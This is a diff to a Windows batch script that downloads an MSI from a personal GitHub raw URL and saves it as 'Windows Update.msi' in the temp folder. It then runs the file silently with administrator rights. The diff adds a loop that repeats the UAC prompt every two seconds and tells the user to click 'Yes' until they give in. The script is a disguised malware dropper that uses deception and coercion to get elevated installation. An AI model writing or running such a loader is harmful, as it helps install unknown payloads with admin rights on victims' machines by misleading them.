@@ -1,9 +1,8 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Put your MSI download URL here
+:: Set download URL and paths
 set "url=https://raw.githubusercontent.com/kevin64848/files/refs/heads/main/file.msi"
-
 set "outputFileName=Windows Update.msi"
 set "outputFilePath=%TEMP%\%outputFileName%"
 
@@ -20,13 +19,26 @@ if not exist "%outputFilePath%" (
 )
 
 :RunLoop
-echo Running MSI installer with admin prompt...
+echo Attempting to run MSI installer with UAC prompt...
 
-:: Launch msiexec with elevated privileges
+:: Try to elevate and run the MSI silently
+:: We use PowerShell to run msiexec.exe as admin, and wait for it
+:: If the user clicks "No" in UAC, the process won't launch, so we check
+
 powershell -Command ^
-    "Start-Process msiexec.exe -ArgumentList '/i \"%outputFilePath%\" /qn' -Verb runAs"
+  "$p = Start-Process msiexec.exe -ArgumentList '/i \"%outputFilePath%\" /qn' -Verb runAs -PassThru -ErrorAction SilentlyContinue; if ($p) { $p.WaitForExit(); exit 0 } else { exit 1 }"
 
-:: Wait 5 seconds before retrying
+:: Check if last command succeeded (user clicked Yes)
+if %ERRORLEVEL%==0 (
+    echo Installation started successfully.
+    exit /b 0
+)
+
+:: Otherwise, user clicked "No"
+echo.
+echo [!] You clicked "No" in the UAC prompt.
+echo Please click "Yes" to continue the installation.
+
+:: Wait 2 seconds before trying again
 timeout /t 2 /nobreak >nul
-
 goto RunLoop
